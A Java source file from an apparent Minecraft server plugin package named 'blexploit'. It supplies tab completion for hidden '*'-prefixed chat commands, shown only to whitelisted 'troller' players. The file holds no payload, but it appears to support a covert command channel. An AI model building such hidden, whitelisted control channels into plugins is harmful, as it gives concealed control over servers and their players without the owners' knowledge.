package de.blexploit.manager;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatTabCompleteEvent;

import de.blexploit.command.Command;
import de.blexploit.command.CommandManager;
import de.blexploit.players.Mittrollers;

public final class TabManager implements Listener {

	public static final String INSERT_PLAYERNAME = "SpielerName";
	public static final String INSERT_NUMBER = "zahl";

	@EventHandler
	private void tabChat(PlayerChatTabCompleteEvent e) {
		if (Mittrollers.containsP(e.getPlayer())) {
			String ChatMessage = e.getChatMessage();
			if (ChatMessage.startsWith("*")) {
				String startWithMsg = "";
				char[] chatMsgChar = e.getChatMessage().toCharArray();
				for (int i = 0; i < chatMsgChar.length; i++) {
					if (i != 0) {
						startWithMsg = startWithMsg + chatMsgChar[i];
					}
				}
				if (!ChatMessage.contains(" ")) {
					e.getTabCompletions().clear();
					for (Command c : CommandManager.Commands) {
						if (c.getCommand().startsWith(startWithMsg)) {
							e.getTabCompletions().add("*" + c.getCommand());
						}
					}
				} else {
					String allArgs[] = startWithMsg.split(" ");
					e.getTabCompletions().clear();
					for (Command c : CommandManager.Commands) {
						if (c.getCommand().equalsIgnoreCase(allArgs[0])) {
							int argLength = 0;
							for (Character ch : e.getChatMessage().toCharArray()) {
								if (ch.equals(' ')) {
									argLength++;
								}
							}
							if (c.getArgs().length >= argLength) {
								String autoComp = c.getArgs()[argLength - 1].toLowerCase();
								String OnlyCom = api.Get.nextArgs(allArgs, argLength).toLowerCase().replace(" ", "");

								if (autoComp.contains("/")) {
									for (String addCom : autoComp.split("/")) {
										if (addCom.startsWith(OnlyCom)) {
											e.getTabCompletions().add(addCom);
										}
									}
								} else if (autoComp.equalsIgnoreCase(TabManager.INSERT_PLAYERNAME)) {
									for (Player online : Bukkit.getOnlinePlayers()) {
										if (online.getName().startsWith(OnlyCom)) {
											e.getTabCompletions().add(online.getName());
										}
									}
								} else if (autoComp.equalsIgnoreCase(TabManager.INSERT_NUMBER)) {
									if (OnlyCom == "") {
										e.getTabCompletions().add("1");
									} else {
										try {
											int numbAdd = Integer.parseInt(OnlyCom) + 1;
											e.getTabCompletions().add(numbAdd + "");
										} catch (NumberFormatException e2) {
											e.getTabCompletions().add("1");
										}
									}
								} else if (autoComp.contains("-")) {
									e.getTabCompletions().add(autoComp);
								}
							}
						}
					}
				}
			}
		}
	}

}
